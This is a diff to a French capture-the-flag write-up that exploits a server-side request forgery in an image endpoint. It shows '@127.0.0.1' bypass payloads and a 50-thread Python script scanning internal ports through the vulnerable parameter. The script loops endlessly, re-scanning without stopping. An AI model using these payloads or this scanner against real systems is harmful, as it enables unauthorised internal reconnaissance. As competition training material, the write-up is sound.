@@ -20,3 +20,30 @@ Le paramètre ```/api/image?fn=``` permet de read des fichiers internes.<br/>
 Je décide donc d'exploiter ce paramètre, en me munissant de ce cheatsheet plutôt complet: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">Link</a>.<br/>
 En premier temps j'essaye  ```/api/image?fn=127.0.0.1```.<br/>
 Malheureusement la requête ne passe pas, j'ajoute donc un ```@``` pour bypass les weak parsers.<br/>
+Toujours rien, en regardant l'énoncé du challenge. Je vois qu'une énumération des ports inférieurs à 2000 est autorisée.<br/>
+Je fais donc la même chose en gardant la même injection ```/api/image?fn=@127.0.0.1:[port]``` et en énumérant les ports.<br/>
+Pour ce faire, j'ai fait un script afin d'automatiser tout ça.<br/>
+```py
+import requests as r
+import threading
+
+def request():
+	while True:
+		with r.session() as s:
+			for i in range(0, 2000 + 1):
+				response = s.get("http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=@127.0.0.1:%s" % (str(i)))
+				if "Internal Server Error" not in response.text:
+					print(response.text)
+
+threads = []
+
+for i in range(50):
+	t = threading.Thread(target=request, daemon=True)
+	threads.append(t)
+
+for i in range(50):
+	threads[i].start()
+
+for i in range(50):
+	threads[i].join()
+```
